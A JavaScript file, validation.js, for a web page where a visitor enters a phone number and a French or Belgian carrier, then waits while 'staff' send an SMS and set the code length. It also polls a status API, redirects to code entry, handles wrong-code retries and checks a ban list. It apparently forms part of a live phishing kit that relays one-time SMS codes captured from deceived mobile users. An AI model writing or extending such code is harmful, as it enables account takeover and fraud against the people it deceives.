/**
 * validation.js — Polling page while user waits for staff to send the SMS
 *
 * v2.3: handles retry=1 URL param (arrived from verify-wait after a false_code).
 *       Shows a "code incorrect, new one incoming" message and keeps polling
 *       for waiting_code status so user gets redirected to code.html with the
 *       correct (possibly new) code length chosen by staff.
 */

const API_STATUS = '/api/status';

function getParam(name) {
    return new URL(window.location.href).searchParams.get(name);
}

const phone   = getParam('phone')   || '';
const carrier = getParam('carrier') || 'orange';
const isRetry = getParam('retry')   === '1';

// ── UI init ───────────────────────────────────────────────────────────────────
const displayPhone = document.getElementById('displayPhone');
if (displayPhone) displayPhone.textContent = phone;

const carrierNames = {
    orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
    base: 'BASE', orange_be: 'Orange Belgique', proximus: 'Proximus', telenet: 'Telenet',
};
const carrierEl = document.getElementById('carrierName');
if (carrierEl) carrierEl.textContent = carrierNames[carrier] || carrier;

if (isRetry) {
    const title       = document.getElementById('valTitle');
    const retryAlert  = document.getElementById('retryAlert');
    const normalAlert = document.getElementById('normalAlert');
    const subtitle    = document.getElementById('valSubtitle');
    if (title)       title.textContent     = 'Nouveau code en préparation…';
    if (subtitle)    subtitle.textContent  = 'Notre équipe configure votre prochain code';
    if (retryAlert)  retryAlert.style.display  = 'block';
    if (normalAlert) normalAlert.style.display = 'none';
}

// ── Ban check ─────────────────────────────────────────────────────────────────
async function checkBan() {
    try {
        const res  = await fetch('/api/check-ban');
        const data = await res.json();
        if (data.banned) window.location.href = 'banned.html';
    } catch (e) { console.error('Ban check error:', e); }
}

// ── Status polling ────────────────────────────────────────────────────────────
async function checkStatus() {
    try {
        const res = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'waiting_code') {
            // Staff has set the new code length → send user to code entry
            const len    = data.code_length || 6;
            const params = new URLSearchParams({ phone, length: len });
            if (isRetry) params.set('retry', '1');
            if (carrier)  params.set('carrier', carrier);
            window.location.href = 'code.html?' + params.toString();

        } else if (data.status === 'wrong_number') {
            window.location.href = 'index.html?wrong_number=1';

        } else if (data.status === 'completed') {
            window.location.href = 'success.html?phone=' + encodeURIComponent(phone);

        } else if (data.status === 'retry_code' && !isRetry) {
            // Edge case: arrived on validation.html without retry flag but status is already retry_code
            const params = new URLSearchParams({ phone, retry: '1' });
            if (carrier) params.set('carrier', carrier);
            window.location.href = 'validation.html?' + params.toString();
        }
        // pending / processing / code_submitted → keep polling
    } catch (e) {
        console.error('Polling error:', e);
    }
}

checkBan().then(() => {
    checkStatus();
    setInterval(checkStatus, 3000);
});
